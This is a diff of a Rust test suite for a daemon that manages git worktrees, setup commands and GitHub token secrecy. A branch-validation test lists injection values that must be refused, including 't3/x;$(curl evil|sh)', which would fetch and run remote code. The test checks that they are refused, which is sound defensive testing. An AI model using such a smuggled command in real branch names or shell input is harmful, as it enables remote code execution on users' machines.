@@ -4,13 +4,16 @@ use std::sync::{Arc, Mutex};
 use std::time::{Duration, Instant};
 
 use foundry_holder::protocol::Request;
+use foundry_proto::factory::ProjectFactory;
 use foundry_proto::ids::{MachineId, ProjectId, TerminalId, WorkspaceId};
 use foundry_proto::record::{AnyRecord, Record, Terminal, Workspace};
 use foundry_proto::settings::Project;
 use foundry_proto::state::TerminalState;
 use tempfile::TempDir;
 
+use super::Setup as Provision;
 use super::*;
+use crate::secrets::{MemorySecrets, Secrets};
 use crate::store::Store;
 use crate::terminals::Terminals;
 use crate::test_log::Logged;
@@ -129,6 +132,15 @@ impl Setup {
 
     /// Terminals started with the holder binary at `holder`, and git calls given `git_within`.
     fn with(holder: PathBuf, git_within: Duration) -> Self {
+        Self::build(holder, git_within, None)
+    }
+
+    /// A setup whose workspaces read GitHub tokens from `secrets`.
+    fn with_secrets(secrets: Arc<dyn Secrets>) -> Self {
+        Self::build(holder(), GIT_WITHIN, Some(secrets))
+    }
+
+    fn build(holder: PathBuf, git_within: Duration, secrets: Option<Arc<dyn Secrets>>) -> Self {
         // A Unix socket path is at most about 100 bytes, which the system's own temporary
         // folder on macOS would take most of.
         let data = tempfile::Builder::new()
@@ -147,6 +159,10 @@ impl Setup {
             terminals.clone(),
             git_within,
         );
+        let workspaces = match secrets {
+            Some(secrets) => workspaces.with_secrets(secrets),
+            None => workspaces,
+        };
         Setup {
             data,
             remotes: tempfile::tempdir().unwrap(),
@@ -189,12 +205,133 @@ impl Setup {
         self.clones().join(format!("{project}.git"))
     }
 
-    fn worktree(&self, project: ProjectId, branch: &str) -> PathBuf {
+    /// Where a P1 create left the worktree of `branch`: `worktrees/<project>/<branch>`.
+    fn legacy(&self, project: ProjectId, branch: &str) -> PathBuf {
         self.data
             .path()
             .join("worktrees")
             .join(project.to_string())
             .join(branch)
+    }
+
+    /// The folder of the newest workspace record of `project` with `branch`, when there is one,
+    /// else the legacy folder, where the sweep tests make worktrees by hand to stand in for P1's.
+    fn worktree(&self, project: ProjectId, branch: &str) -> PathBuf {
+        let id = {
+            let store = self.store.lock().unwrap();
+            store
+                .since(self.me, 0)
+                .unwrap()
+                .into_iter()
+                .filter_map(|record| match record {
+                    AnyRecord::Workspace(r)
+                        if r.body.project == project && r.body.branch == branch =>
+                    {
+                        Some(r.body.id)
+                    }
+                    _ => None,
+                })
+                .next_back()
+        };
+        match id {
+            Some(id) => self.folder_of(project, id),
+            None => self.legacy(project, branch),
+        }
+    }
+
+    /// Where a create makes the worktree of workspace `id`.
+    fn folder_of(&self, project: ProjectId, id: WorkspaceId) -> PathBuf {
+        self.legacy(project, &id.to_string())
+    }
+
+    /// The names in `worktrees/<project>/`; none when the folder is not there.
+    fn folders(&self, project: ProjectId) -> Vec<String> {
+        let dir = self.data.path().join("worktrees").join(project.to_string());
+        if dir.exists() {
+            names_in(&dir)
+        } else {
+            Vec::new()
+        }
+    }
+
+    /// Settings with the factory on for `project`, acting as `login`.
+    fn factory_on(&self, project: ProjectId, login: &str) {
+        let mut store = self.store.lock().unwrap();
+        let mut settings = store.settings().unwrap();
+        settings.seq += 1;
+        settings.project_factory.insert(
+            project,
+            ProjectFactory {
+                on: true,
+                login: login.into(),
+                paused: false,
+            },
+        );
+        assert!(store.apply_settings(settings).unwrap());
+    }
+
+    /// The workspace records the store holds.
+    fn workspace_records(&self) -> Vec<Record<Workspace>> {
+        let store = self.store.lock().unwrap();
+        store
+            .since(self.me, 0)
+            .unwrap()
+            .into_iter()
+            .filter_map(|record| match record {
+                AnyRecord::Workspace(r) => Some(r),
+                _ => None,
+            })
+            .collect()
+    }
+
+    async fn make(
+        &self,
+        remote: &Remote,
+        name: &str,
+        checkout: Checkout,
+        provision: Provision,
+        tag: Option<FactoryTag>,
+    ) -> Result<WorkspaceId, WorkspaceError> {
+        self.workspaces
+            .create_with(remote.project, name, checkout, provision, tag)
+            .await
+    }
+
+    /// A workspace as P1's create left it: its worktree at `worktrees/<project>/<branch>` and
+    /// its record written by hand.
+    async fn p1_workspace(&self, remote: &Remote, branch: &str) -> (WorkspaceId, PathBuf) {
+        let worktree = self.leftover(remote, branch).await;
+        let id = WorkspaceId::random();
+        let body = Workspace {
+            id,
+            project: remote.project,
+            name: branch.into(),
+            branch: branch.into(),
+            base: "main".into(),
+            setup: None,
+        };
+        self.workspaces.inner.write_new(body).await.unwrap();
+        (id, worktree)
+    }
+
+    /// The commit `reference` names in the remote's bare repo.
+    fn remote_at(&self, remote: &Remote, reference: &str) -> String {
+        git(&remote.bare, &["rev-parse", "--verify", reference])
+            .trim()
+            .to_owned()
+    }
+
+    /// The processes whose command line holds `marker`.
+    fn processes_with(marker: &str) -> Vec<String> {
+        let out = Command::new("ps")
+            .args(["-A", "-o", "pid=,args="])
+            .output()
+            .unwrap();
+        String::from_utf8_lossy(&out.stdout)
+            .lines()
+            .filter(|l| l.contains(marker))
+            .map(str::to_owned)
+            .collect()
     }
 
     async fn create(&self, remote: &Remote, base: &str, name: &str) -> WorkspaceId {
@@ -3358,4 +3495,893 @@ async fn a_remote_branch_of_the_same_name_without_this_workspaces_work_is_not_pu
     let read = workspaces.shipping(id).await.unwrap();
     assert!(read.pushed);
     assert_eq!(read.unpushed, 0);
+}
+
+// ---- Checkouts, setup kinds, folders by id and the factory tag ----
+
+fn new_branch(base: &str, branch: &str) -> Checkout {
+    Checkout::NewBranch {
+        base: base.into(),
+        branch: Some(branch.into()),
+    }
+}
+
+fn existing(name: &str) -> Checkout {
+    Checkout::Branch { name: name.into() }
+}
+
+fn commit_of(sha: &str) -> Checkout {
+    Checkout::Commit { sha: sha.into() }
+}
+
+fn commands(commands: &[&str], limit_secs: u64) -> Provision {
+    Provision::Commands {
+        commands: commands.iter().map(|c| (*c).to_owned()).collect(),
+        limit_secs,
+    }
+}
+
+fn tag(project: ProjectId, run: &str) -> Option<FactoryTag> {
+    Some(FactoryTag {
+        project,
+        run: run.into(),
+    })
+}
+
+#[test]
+fn let_only_an_ordinary_branch_name_into_a_command_a_session_runs() {
+    for ok in ["t3code/abc", "t3/2e8db933", "feat/x_y-z.1", "fac/12-1"] {
+        assert!(!branch_refused(ok), "{ok:?}");
+    }
+    for bad in [
+        "",
+        "-x",
+        "a b",
+        "a..b",
+        "feat/x;y",
+        "t3/x`y`",
+        "t3/x;$(curl evil|sh)",
+        "café",
+        "a\nb",
+    ] {
+        assert!(branch_refused(bad), "{bad:?}");
+    }
+}
+
+#[tokio::test]
+async fn a_new_workspaces_folder_is_named_by_its_id() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    let id = setup.create(&remote, "main", "fix login").await;
+
+    let folder = setup.folder_of(remote.project, id);
+    assert!(folder.join("README.md").exists());
+    assert_eq!(setup.workspaces.worktree(id).await.unwrap(), folder);
+    assert_eq!(setup.folders(remote.project), [id.to_string()]);
+    assert_eq!(setup.body(id).branch, "fix-login");
+}
+
+#[tokio::test]
+async fn a_given_branch_is_used_exactly_with_its_slash() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    let id = setup
+        .make(
+            &remote,
+            "issue 12",
+            new_branch("main", "fac/12-1"),
+            Provision::Own,
+            None,
+        )
+        .await
+        .unwrap();
+
+    let body = setup.body(id);
+    assert_eq!(body.branch, "fac/12-1");
+    assert_eq!(body.base, "main");
+    assert_eq!(body.name, "issue 12");
+    setup.branch_at(remote.project, "fac/12-1");
+    let worktree = setup.workspaces.worktree(id).await.unwrap();
+    assert_eq!(
+        git(&worktree, &["branch", "--show-current"]).trim(),
+        "fac/12-1"
+    );
+    // The branch is one ref, and the folder is still one part under the project's.
+    assert_eq!(setup.folders(remote.project), [id.to_string()]);
+}
+
+#[tokio::test]
+async fn a_given_branch_that_exists_is_refused_and_one_that_differs_only_in_case_too() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    setup
+        .make(
+            &remote,
+            "one",
+            new_branch("main", "fac/12-1"),
+            Provision::Own,
+            None,
+        )
+        .await
+        .unwrap();
+    for branch in ["fac/12-1", "FAC/12-1"] {
+        let err = setup
+            .make(
+                &remote,
+                "two",
+                new_branch("main", branch),
+                Provision::Own,
+                None,
+            )
+            .await
+            .unwrap_err();
+        assert!(
+            matches!(err, WorkspaceError::BranchExists(ref b) if b == branch),
+            "{err:?}"
+        );
+    }
+    assert_eq!(setup.folders(remote.project).len(), 1);
+}
+
+#[tokio::test]
+async fn a_pull_request_branch_with_a_leading_dash_or_dots_is_refused_before_git_runs() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    for bad in ["-x", "a..b", "a b", "", "x;y", "café"] {
+        for checkout in [new_branch("main", bad), existing(bad)] {
+            let err = setup
+                .make(&remote, "pr", checkout, Provision::Own, None)
+                .await
+                .unwrap_err();
+            assert!(
+                matches!(err, WorkspaceError::BranchRefused(ref b) if b == bad),
+                "{bad:?}: {err:?}"
+            );
+        }
+    }
+    // Git never ran: the project's clone was never made, and nothing was recorded.
+    assert!(!setup.clone_of(remote.project).exists());
+    assert!(setup.folders(remote.project).is_empty());
+    assert!(setup.workspace_records().is_empty());
+    assert!(!setup.data.path().join("worktrees").exists());
+}
+
+#[tokio::test]
+async fn a_second_worktree_on_a_branch_is_refused_while_the_first_exists() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    remote.push("feature", &[("F.md", "one\n")]);
+    let first = setup
+        .make(&remote, "first", existing("feature"), Provision::Own, None)
+        .await
+        .unwrap();
+    let body = setup.body(first);
+    assert_eq!(
+        (body.branch.as_str(), body.base.as_str()),
+        ("feature", "feature")
+    );
+    let worktree = setup.workspaces.worktree(first).await.unwrap();
+    assert_eq!(
+        std::fs::read_to_string(worktree.join("F.md")).unwrap(),
+        "one\n"
+    );
+    assert_eq!(
+        git(&worktree, &["branch", "--show-current"]).trim(),
+        "feature"
+    );
+
+    let err = setup
+        .make(&remote, "second", existing("feature"), Provision::Own, None)
+        .await
+        .unwrap_err();
+    assert!(
+        matches!(err, WorkspaceError::BranchCheckedOut(ref b) if b == "feature"),
+        "{err:?}"
+    );
+    // A new branch of that name is refused too.
+    let err = setup
+        .make(
+            &remote,
+            "third",
+            new_branch("main", "feature"),
+            Provision::Own,
+            None,
+        )
+        .await
+        .unwrap_err();
+    assert!(matches!(err, WorkspaceError::BranchExists(_)), "{err:?}");
+    assert_eq!(setup.folders(remote.project), [first.to_string()]);
+    assert_eq!(setup.workspace_records().len(), 1);
+}
+
+#[tokio::test]
+async fn a_branch_checkout_moves_a_stale_local_branch_to_origins_once_the_first_is_archived() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    remote.push("feature", &[("F.md", "one\n")]);
+    let first = setup
+        .make(&remote, "first", existing("feature"), Provision::Own, None)
+        .await
+        .unwrap();
+    setup.workspaces.archive(first, false).await.unwrap();
+    let stale = setup.branch_at(remote.project, "feature");
+
+    // The remote's branch moves on while the local one stays where the archive kept it.
+    remote.push("feature", &[("F.md", "two\n")]);
+    let tip = setup.remote_at(&remote, "refs/heads/feature");
+    assert_ne!(stale.trim(), tip);
+
+    let again = setup
+        .make(&remote, "again", existing("feature"), Provision::Own, None)
+        .await
+        .unwrap();
+    assert_eq!(setup.branch_at(remote.project, "feature").trim(), tip);
+    let worktree = setup.workspaces.worktree(again).await.unwrap();
+    assert_eq!(
+        std::fs::read_to_string(worktree.join("F.md")).unwrap(),
+        "two\n"
+    );
+    assert_eq!(
+        git(&worktree, &["branch", "--show-current"]).trim(),
+        "feature"
+    );
+}
+
+#[tokio::test]
+async fn a_branch_the_remote_does_not_have_is_unknown_and_nothing_is_made() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    let err = setup
+        .make(&remote, "pr", existing("nope"), Provision::Own, None)
+        .await
+        .unwrap_err();
+    assert!(
+        matches!(err, WorkspaceError::UnknownBase(ref b) if b == "nope"),
+        "{err:?}"
+    );
+    assert!(setup.folders(remote.project).is_empty());
+    assert!(setup.workspace_records().is_empty());
+    let branches = git(
+        &setup.clone_of(remote.project),
+        &["for-each-ref", "--format=%(refname)", "refs/heads/"],
+    );
+    assert_eq!(branches, "");
+}
+
+#[tokio::test]
+async fn a_failed_branch_checkout_puts_the_local_branch_back_where_it_was() {
+    use std::os::unix::fs::PermissionsExt as _;
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    remote.push("feature", &[("F.md", "one\n")]);
+    remote.push("fresh", &[("G.md", "one\n")]);
+    let first = setup
+        .make(&remote, "first", existing("feature"), Provision::Own, None)
+        .await
+        .unwrap();
+    setup.workspaces.archive(first, false).await.unwrap();
+    let stale = setup.branch_at(remote.project, "feature");
+    remote.push("feature", &[("F.md", "two\n")]);
+
+    // The store cannot make its journal in a folder it may not write, so the record fails.
+    let mode = |m| {
+        std::fs::set_permissions(setup.data.path(), std::fs::Permissions::from_mode(m)).unwrap()
+    };
+    mode(0o500);
+    let moved = setup
+        .make(&remote, "again", existing("feature"), Provision::Own, None)
+        .await;
+    let made = setup
+        .make(&remote, "fresh", existing("fresh"), Provision::Own, None)
+        .await;
+    mode(0o700);
+    assert!(matches!(moved, Err(WorkspaceError::Store(_))), "{moved:?}");
+    assert!(matches!(made, Err(WorkspaceError::Store(_))), "{made:?}");
+
+    // The stale branch is where it was; the one this create made is gone.
+    assert_eq!(setup.branch_at(remote.project, "feature"), stale);
+    let branches = git(
+        &setup.clone_of(remote.project),
+        &["for-each-ref", "--format=%(refname)", "refs/heads/"],
+    );
+    assert_eq!(branches.trim(), "refs/heads/feature");
+    assert!(setup.folders(remote.project).len() == 1);
+    assert_eq!(setup.listed(remote.project).matches("worktree ").count(), 1);
+}
+
+#[tokio::test]
+async fn a_commit_checkout_is_detached_at_the_commit_and_leaves_no_branch() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "one\n")]);
+    let sha = setup.remote_at(&remote, "refs/heads/main");
+    remote.push("main", &[("README.md", "two\n")]);
+    let first = setup.create(&remote, "main", "first").await;
+    let before = git(
+        &setup.clone_of(remote.project),
+        &[
+            "for-each-ref",
+            "--format=%(refname) %(objectname)",
+            "refs/heads/",
+        ],
+    );
+
+    let id = setup
+        .make(&remote, "gate", commit_of(&sha), Provision::Own, None)
+        .await
+        .unwrap();
+
+    let after = git(
+        &setup.clone_of(remote.project),
+        &[
+            "for-each-ref",
+            "--format=%(refname) %(objectname)",
+            "refs/heads/",
+        ],
+    );
+    assert_eq!(after, before);
+    let body = setup.body(id);
+    assert_eq!(body.branch, "");
+    assert_eq!(body.base, sha);
+    assert_eq!(body.name, "gate");
+    let worktree = setup.workspaces.worktree(id).await.unwrap();
+    assert_eq!(worktree, setup.folder_of(remote.project, id));
+    assert_eq!(git(&worktree, &["rev-parse", "HEAD"]).trim(), sha);
+    assert_eq!(git(&worktree, &["branch", "--show-current"]).trim(), "");
+    assert_eq!(
+        std::fs::read_to_string(worktree.join("README.md")).unwrap(),
+        "one\n"
+    );
+
+    // It is a workspace like any: a commit made in it is work to refuse, and force removes it.
+    git(
+        &worktree,
+        &["commit", "-q", "--allow-empty", "-m", "only here"],
+    );
+    let err = setup.workspaces.archive(id, false).await.unwrap_err();
+    assert!(matches!(err, WorkspaceError::Dirty(_)), "{err:?}");
+    setup.workspaces.archive(id, true).await.unwrap();
+    assert!(!worktree.exists());
+    assert!(setup.record(id).unwrap().deleted);
+    assert!(!setup.record(first).unwrap().deleted);
+}
+
+#[tokio::test]
+async fn a_clean_commit_checkout_archives_without_force() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "one\n")]);
+    let sha = setup.remote_at(&remote, "refs/heads/main");
+    let id = setup
+        .make(&remote, "gate", commit_of(&sha), Provision::Own, None)
+        .await
+        .unwrap();
+    let worktree = setup.workspaces.worktree(id).await.unwrap();
+
+    setup.workspaces.archive(id, false).await.unwrap();
+
+    assert!(!worktree.exists());
+}
+
+#[tokio::test]
+async fn a_commit_that_is_not_a_full_object_id_is_refused_before_git_runs() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "one\n")]);
+    let sha = setup.remote_at(&remote, "refs/heads/main");
+    let upper = sha.to_uppercase();
+    let long = format!("{sha}0");
+    for bad in [
+        "",
+        "main",
+        "abc123",
+        "--all",
+        &sha[..39],
+        upper.as_str(),
+        long.as_str(),
+    ] {
+        let err = setup
+            .make(&remote, "gate", commit_of(bad), Provision::Own, None)
+            .await
+            .unwrap_err();
+        assert!(
+            matches!(err, WorkspaceError::NotACommitId(ref b) if b == bad),
+            "{bad:?}: {err:?}"
+        );
+    }
+    assert!(!setup.clone_of(remote.project).exists());
+    assert!(setup.workspace_records().is_empty());
+}
+
+#[tokio::test]
+async fn a_commit_the_remote_does_not_have_is_unknown_and_nothing_is_made() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "one\n")]);
+    let missing = "0".repeat(40);
+    let err = setup
+        .make(&remote, "gate", commit_of(&missing), Provision::Own, None)
+        .await
+        .unwrap_err();
+    assert!(
+        matches!(err, WorkspaceError::UnknownCommitId(ref c) if *c == missing),
+        "{err:?}"
+    );
+    assert!(setup.folders(remote.project).is_empty());
+    assert!(setup.workspace_records().is_empty());
+}
+
+#[tokio::test]
+async fn sweep_names_a_commit_workspace_by_its_id_and_removes_an_archived_one() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "one\n")]);
+    let sha = setup.remote_at(&remote, "refs/heads/main");
+    let live = setup
+        .make(&remote, "live", commit_of(&sha), Provision::Own, None)
+        .await
+        .unwrap();
+    let gone = setup
+        .make(&remote, "gone", commit_of(&sha), Provision::Own, None)
+        .await
+        .unwrap();
+    // The record says archived, but the worktree is still there.
+    let body = setup.body(gone);
+    setup.workspaces.inner.write(body, true).await.unwrap();
+
+    setup.workspaces.sweep().await.unwrap();
+
+    assert!(setup.folder_of(remote.project, live).exists());
+    assert!(!setup.folder_of(remote.project, gone).exists());
+}
+
+#[tokio::test]
+async fn a_p1_workspace_is_found_kept_by_the_sweep_and_archived() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    let (id, worktree) = setup.p1_workspace(&remote, "old").await;
+
+    assert_eq!(setup.workspaces.worktree(id).await.unwrap(), worktree);
+    let seen = setup
+        .workspaces
+        .start_in(id, |dir| async move { Ok::<_, WorkspaceError>(dir) })
+        .await
+        .unwrap();
+    assert_eq!(seen, worktree);
+
+    setup.workspaces.sweep().await.unwrap();
+    assert!(worktree.exists());
+
+    // A new workspace may not take its branch or its folder.
+    let err = setup
+        .workspaces
+        .create(remote.project, "main", "old")
+        .await
+        .unwrap_err();
+    assert!(matches!(err, WorkspaceError::BranchExists(_)), "{err:?}");
+
+    setup.workspaces.archive(id, false).await.unwrap();
+    assert!(!worktree.exists());
+    assert!(setup.record(id).unwrap().deleted);
+    setup.branch_at(remote.project, "old");
+}
+
+#[tokio::test]
+async fn a_p1_workspace_whose_folder_was_removed_by_hand_still_archives() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    let (id, worktree) = setup.p1_workspace(&remote, "old").await;
+    std::fs::remove_dir_all(&worktree).unwrap();
+
+    setup.workspaces.archive(id, false).await.unwrap();
+
+    assert!(setup.record(id).unwrap().deleted);
+    // Git forgot it, so its branch can be checked out again.
+    let elsewhere = setup.data.path().join("elsewhere");
+    git(
+        &setup.clone_of(remote.project),
+        &[
+            "worktree",
+            "add",
+            "-q",
+            "--",
+            elsewhere.to_str().unwrap(),
+            "old",
+        ],
+    );
+}
+
+#[tokio::test]
+async fn commands_stop_at_the_first_that_fails_and_the_terminal_exits_with_its_code() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    let id = setup
+        .make(
+            &remote,
+            "cmds",
+            commit_of(&setup.remote_at(&remote, "refs/heads/main")),
+            commands(&["true", "exit 3", "echo never"], 30),
+            None,
+        )
+        .await
+        .unwrap();
+
+    let terminal = setup.setup_ended(id).await;
+    assert_eq!(terminal.exit_code, Some(3));
+    let screen = setup.screen(terminal.id).await;
+    assert!(
+        screen.contains("setup failed: exit 3 exited 3"),
+        "{screen:?}"
+    );
+    assert!(!screen.contains("never"), "{screen:?}");
+    assert!(!screen.contains("ran past"), "{screen:?}");
+}
+
+#[tokio::test]
+async fn commands_that_all_pass_exit_zero_and_a_fast_one_is_not_reported_as_killed() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    let id = setup
+        .make(
+            &remote,
+            "cmds",
+            new_branch("main", "cmds"),
+            commands(&["echo one > one.txt", "echo two > two.txt", "true"], 30),
+            None,
+        )
+        .await
+        .unwrap();
+
+    let terminal = setup.setup_ended(id).await;
+    assert_eq!(terminal.exit_code, Some(0));
+    let screen = setup.screen(terminal.id).await;
+    assert!(screen.contains("setup passed"), "{screen:?}");
+    assert!(!screen.contains("ran past"), "{screen:?}");
+    let worktree = setup.workspaces.worktree(id).await.unwrap();
+    assert_eq!(
+        std::fs::read_to_string(worktree.join("two.txt")).unwrap(),
+        "two\n"
+    );
+}
+
+#[tokio::test]
+async fn a_command_that_sleeps_past_its_limit_is_killed_and_the_exit_code_is_124() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    let started = Instant::now();
+    // The second sleep is a child of the shell, left running past the first's end.
+    let id = setup
+        .make(
+            &remote,
+            "slow",
+            new_branch("main", "slow"),
+            commands(&["sleep 3193 & sleep 3191", "echo never"], 1),
+            None,
+        )
+        .await
+        .unwrap();
+
+    let terminal = setup.setup_ended(id).await;
+    assert!(
+        started.elapsed() < Duration::from_secs(15),
+        "{:?}",
+        started.elapsed()
+    );
+    assert_eq!(terminal.exit_code, Some(124));
+    let screen = setup.screen(terminal.id).await;
+    assert!(screen.contains("ran past 1 s"), "{screen:?}");
+    assert!(!screen.contains("never"), "{screen:?}");
+    let deadline = Instant::now() + Duration::from_secs(5);
+    loop {
+        let left = [
+            Setup::processes_with("sleep 3191"),
+            Setup::processes_with("sleep 3193"),
+        ]
+        .concat();
+        if left.is_empty() {
+            break;
+        }
+        assert!(Instant::now() < deadline, "left running: {left:?}");
+        tokio::time::sleep(Duration::from_millis(50)).await;
+    }
+}
+
+#[tokio::test]
+async fn no_setup_starts_no_terminal_even_with_a_config() {
+    let setup = Setup::new();
+    let config = "factory:\n  provision:\n    - echo one > one.txt\n";
+    let remote = setup.project(&[(".dw/config.yml", config)]);
+    let id = setup
+        .make(
+            &remote,
+            "bare",
+            new_branch("main", "bare"),
+            Provision::None,
+            None,
+        )
+        .await
+        .unwrap();
+    assert_eq!(setup.body(id).setup, None);
+    assert!(setup.terminals_of(id).is_empty());
+}
+
+#[tokio::test]
+async fn the_same_tag_and_name_twice_make_one_workspace() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    let make = || {
+        setup.make(
+            &remote,
+            "run 1",
+            new_branch("main", "fac/1-1"),
+            commands(&["true"], 30),
+            tag(remote.project, "owner__repo__1__1"),
+        )
+    };
+    let first = make().await.unwrap();
+    // The remote moves on: an answer from the first does not even fetch.
+    remote.push("main", &[("NEW.md", "new\n")]);
+    let second = make().await.unwrap();
+
+    assert_eq!(first, second);
+    assert_eq!(setup.workspace_records().len(), 1);
+    assert_eq!(setup.terminals_of(first).len(), 1);
+    // The worktree and its marker, and nothing else.
+    let mut want = vec![first.to_string(), format!("{first}.factory")];
+    want.sort();
+    assert_eq!(setup.folders(remote.project), want);
+    let marker = std::fs::read_to_string(
+        setup
+            .data
+            .path()
+            .join("worktrees")
+            .join(remote.project.to_string())
+            .join(format!("{first}.factory")),
+    )
+    .unwrap();
+    let marker: serde_json::Value = serde_json::from_str(&marker).unwrap();
+    assert_eq!(marker["run"], "owner__repo__1__1");
+    assert_eq!(marker["name"], "run 1");
+    assert_eq!(marker["project"], remote.project.to_string());
+}
+
+#[tokio::test]
+async fn the_same_tag_with_another_name_or_run_makes_another_workspace() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    let sha = setup.remote_at(&remote, "refs/heads/main");
+    let a = setup
+        .make(
+            &remote,
+            "a",
+            commit_of(&sha),
+            Provision::None,
+            tag(remote.project, "run"),
+        )
+        .await
+        .unwrap();
+    let b = setup
+        .make(
+            &remote,
+            "b",
+            commit_of(&sha),
+            Provision::None,
+            tag(remote.project, "run"),
+        )
+        .await
+        .unwrap();
+    let c = setup
+        .make(
+            &remote,
+            "a",
+            commit_of(&sha),
+            Provision::None,
+            tag(remote.project, "other"),
+        )
+        .await
+        .unwrap();
+    // No tag is no answer to a tagged one.
+    let d = setup
+        .make(&remote, "a", commit_of(&sha), Provision::None, None)
+        .await
+        .unwrap();
+    let ids = HashSet::from([a, b, c, d]);
+    assert_eq!(ids.len(), 4);
+}
+
+#[tokio::test]
+async fn a_tag_whose_workspace_was_archived_answers_for_nothing() {
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    let sha = setup.remote_at(&remote, "refs/heads/main");
+    let first = setup
+        .make(
+            &remote,
+            "a",
+            commit_of(&sha),
+            Provision::None,
+            tag(remote.project, "run"),
+        )
+        .await
+        .unwrap();
+    let marker = setup
+        .data
+        .path()
+        .join("worktrees")
+        .join(remote.project.to_string())
+        .join(format!("{first}.factory"));
+    assert!(marker.exists());
+
+    setup.workspaces.archive(first, false).await.unwrap();
+    assert!(!marker.exists());
+
+    // A marker left behind whose workspace is not live is ignored too.
+    std::fs::write(
+        &marker,
+        format!(
+            r#"{{"project":"{}","run":"run","name":"a"}}"#,
+            remote.project
+        ),
+    )
+    .unwrap();
+    let second = setup
+        .make(
+            &remote,
+            "a",
+            commit_of(&sha),
+            Provision::None,
+            tag(remote.project, "run"),
+        )
+        .await
+        .unwrap();
+    assert_ne!(first, second);
+}
+
+/// The value the terminal's `env` printed for `name`, if it printed one.
+fn env_value(screen: &str, name: &str) -> Option<String> {
+    screen
+        .lines()
+        .find_map(|l| l.strip_prefix(&format!("{name}=")).map(str::to_owned))
+}
+
+#[tokio::test]
+async fn a_factory_workspaces_setup_terminal_holds_no_token_and_no_askpass() {
+    const TOKEN: &str = "ghp_madeUpToken1234567890abcdefABCDEF";
+    let secrets = Arc::new(MemorySecrets::default());
+    secrets.set("github:rawphp", TOKEN).unwrap();
+    let setup = Setup::with_secrets(secrets);
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    setup.factory_on(remote.project, "rawphp");
+    let id = setup
+        .make(
+            &remote,
+            "env",
+            new_branch("main", "fac/9-1"),
+            commands(&["env"], 30),
+            tag(remote.project, "run"),
+        )
+        .await
+        .unwrap();
+
+    let terminal = setup.setup_ended(id).await;
+    assert_eq!(terminal.exit_code, Some(0));
+    let screen = setup.screen(terminal.id).await;
+    assert!(screen.contains("PATH="), "env printed nothing: {screen:?}");
+    assert!(!screen.contains(TOKEN), "{screen:?}");
+    assert!(!screen.contains("FOUNDRY_GIT_TOKEN"), "{screen:?}");
+    for name in ["GIT_ASKPASS", "GH_TOKEN", "GITHUB_TOKEN"] {
+        assert_eq!(env_value(&screen, name).unwrap_or_default(), "", "{name}");
+    }
+    assert_eq!(
+        env_value(&screen, "GIT_CONFIG_GLOBAL").as_deref(),
+        Some("/dev/null")
+    );
+}
+
+#[tokio::test]
+async fn a_factory_project_with_no_token_is_refused_and_nothing_is_made() {
+    let setup = Setup::with_secrets(Arc::new(MemorySecrets::default()));
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    setup.factory_on(remote.project, "rawphp");
+    let err = setup
+        .make(
+            &remote,
+            "run",
+            new_branch("main", "fac/9-1"),
+            Provision::Own,
+            None,
+        )
+        .await
+        .unwrap_err();
+    assert!(matches!(err, WorkspaceError::NoToken(_)), "{err:?}");
+    assert!(err.to_string().contains("rawphp"), "{err}");
+    assert!(setup.folders(remote.project).is_empty());
+    assert!(setup.workspace_records().is_empty());
+    assert!(!setup.data.path().join("fetches").exists());
+    if setup.clone_of(remote.project).exists() {
+        let branches = git(
+            &setup.clone_of(remote.project),
+            &["for-each-ref", "--format=%(refname)", "refs/heads/"],
+        );
+        assert_eq!(branches, "");
+    }
+
+    // With no secret store at all, the same.
+    let setup = Setup::new();
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    setup.factory_on(remote.project, "rawphp");
+    let err = setup.workspaces.create(remote.project, "main", "run").await;
+    assert!(matches!(err, Err(WorkspaceError::NoToken(_))), "{err:?}");
+    assert!(setup.workspace_records().is_empty());
+}
+
+#[tokio::test]
+async fn a_factory_project_with_a_token_is_fetched_through_a_repo_only_the_daemon_writes() {
+    const TOKEN: &str = "ghp_madeUpToken1234567890abcdefABCDEF";
+    let secrets = Arc::new(MemorySecrets::default());
+    secrets.set("github:rawphp", TOKEN).unwrap();
+    let setup = Setup::with_secrets(secrets);
+    let remote = setup.project(&[("README.md", "hello\n")]);
+    setup.factory_on(remote.project, "rawphp");
+    let logs = Logged::default();
+    let _guard = logs.capture();
+
+    let id = setup.create(&remote, "main", "run").await;
+    let worktree = setup.workspaces.worktree(id).await.unwrap();
+    assert_eq!(
+        std::fs::read_to_string(worktree.join("README.md")).unwrap(),
+        "hello\n"
+    );
+    assert!(
+        setup
+            .data
+            .path()
+            .join("fetches")
+            .join(format!("{}.git", remote.project))
+            .exists()
+    );
+
+    // A later fetch brings what the remote gained.
+    remote.push("next", &[("NEXT.md", "two\n")]);
+    let next = setup.create(&remote, "next", "second").await;
+    let worktree = setup.workspaces.worktree(next).await.unwrap();
+    assert_eq!(
+        std::fs::read_to_string(worktree.join("NEXT.md")).unwrap(),
+        "two\n"
+    );
+    assert!(!logs.text().contains(TOKEN));
